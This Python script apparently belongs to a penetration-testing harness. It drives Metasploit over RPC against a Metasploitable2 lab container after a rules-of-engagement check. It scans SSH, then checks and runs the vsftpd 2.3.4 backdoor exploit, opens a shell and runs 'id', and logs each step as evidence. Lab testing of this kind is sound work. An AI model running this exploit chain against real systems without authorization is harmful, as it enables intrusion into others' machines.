#!/usr/bin/env python3
"""MVP live attack against Metasploitable2 Docker target."""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from msf_harness.mcp.policy.roe import enforce_roe

TARGET = "10.255.255.254"
ENGAGEMENT = "lab-default"
EVIDENCE = ROOT / "evidence" / "msf"
EVIDENCE.mkdir(parents=True, exist_ok=True)


def save(name: str, data: dict) -> None:
    path = EVIDENCE / f"mvp-{name}.json"
    path.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
    print(f"  [evidence] {path.name}")


def main() -> int:
    from msf_harness.mcp.rpc.client import get_rpc, reset_client

    reset_client()
    client = get_rpc()
    print("=== RPC OK ===", client.call("core.version", []))

    # ROE check
    denial = enforce_roe(ENGAGEMENT, targets=TARGET)
    if denial:
        print("ROE DENIED:", denial)
        return 1
    print(f"=== ROE OK for {TARGET} ===")

    # Step 1: SSH version scan
    print("\n=== Step 1: SSH version scan (9022) ===")
    mod = client.modules.use("auxiliary", "scanner/ssh/ssh_version")
    mod["RHOSTS"] = TARGET
    mod["RPORT"] = "9022"
    job = mod.execute()
    print("  job:", job)
    time.sleep(8)
    save("ssh-scan", {"job": job, "target": TARGET, "port": 9022})

    # Step 2: vsftpd backdoor check
    print("\n=== Step 2: vsftpd 2.3.4 backdoor check (9021) ===")
    mod = client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
    mod["RHOSTS"] = TARGET
    mod["RPORT"] = "9021"
    try:
        check = mod.check()
        print("  check:", check)
        save("vsftpd-check", {"check": check, "target": TARGET, "port": 9021})
    except Exception as e:
        print("  check error:", e)

    # Step 3: vsftpd exploit (bind shell, no reverse needed)
    print("\n=== Step 3: vsftpd exploit (9021) ===")
    mod = client.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
    mod["RHOSTS"] = TARGET
    mod["RPORT"] = "9021"
    result = mod.execute()
    print("  execute:", result)
    save("vsftpd-exploit", {"result": result})

    time.sleep(5)
    sessions = client.sessions.list
    print("\n=== Sessions ===", sessions)
    save("sessions", {"sessions": sessions})

    if isinstance(sessions, dict) and sessions:
        sid = int(list(sessions.keys())[0])
        print(f"\n=== Session {sid}: id command ===")
        client.call("session.shell_write", [sid, "id\n"])
        time.sleep(3)
        out = client.call("session.shell_read", [sid])
        print("  output:", out.get("data", ""))
        save("session-id", {"session_id": sid, "output": out})
        print("\n*** MVP SUCCESS: shell obtained ***")
        return 0

    print("\n=== No session yet - target may need reverse shell setup ===")
    return 0


if __name__ == "__main__":
    sys.exit(main())
